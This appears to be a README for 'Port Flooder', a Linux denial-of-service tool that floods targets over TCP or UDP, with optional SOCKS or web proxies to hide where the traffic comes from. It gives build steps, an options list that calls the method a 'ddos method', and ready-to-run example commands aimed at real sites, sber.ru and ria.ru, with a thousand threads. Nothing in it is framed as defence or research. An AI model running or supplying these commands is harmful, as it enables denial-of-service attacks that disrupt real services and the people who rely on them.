# Port Flooder
Port flooding application (for Linux)

# Methods
 - TCP (with proxy)
 - UDP (no proxy)

# Features
 - Can send not just random data but also data from <b>file</b>
 - Can use proxy (now it's just for TCP)

# Dependencies

```less
git
cmake>=3
make
g++
```

# Use

To download install git on your machine and type:
```bash
git clone https://github.com/imperzer0/port_flooder.git
```

<h2>Archlinux</h2>

```bash
cd port_flooder
makepkg -sif
```

<h2>Other distributions</h2>

Compile:
```bash
cd port_flooder
cmake -DCMAKE_BUILD_TYPE=Release -DCMAKE_C_COMPILER=gcc -DCMAKE_CXX_COMPILER=g++ -DPACKAGE_VERSION="port-flooder (GIT)" .
make
```

Run with command:
```less
./port_flooder -m <method> -t <target> -T <threads_count> -a <amplifier> [ -d <file> -D -p <proxy_address> -s <sock_version> -U <username> -P <password> ]
```

Program arguments description:
```less
Options:
 --method|-m        <method>    ddos method
 --target|-t        <target>    target address
 --threads|-T       <threads>   threads count
 --amplifier|-a     <amplifier> in-thread requests count
 --data|-d          <file>      send data from file
 --debug|-D                     toggle debug printing
 --proxy|-p         <proxy>     proxy address
 --sockver|-s       <version>   proxy version:
                                 - DIRECT
                                 - SOCKS4
                                 - SOCKS5
                                 - WEB
 --proxyuser|-U     <user>      proxy username
 --proxypassword|-P <password>  password of proxy user
 ```

# Examples

```bash
./port_flooder -m TCP -t http://sber.ru -T 1000 -a 100 -d http_header.txt -p socks5://proxy.com -s SOCK5
```

```bash
./port_flooder -m TCP -t http://ria.ru -T 1000 -a 10
```

```bash
./port_flooder -m UDP -t http://ria.ru -T 1000 -a 10 -d http_header.txt
```
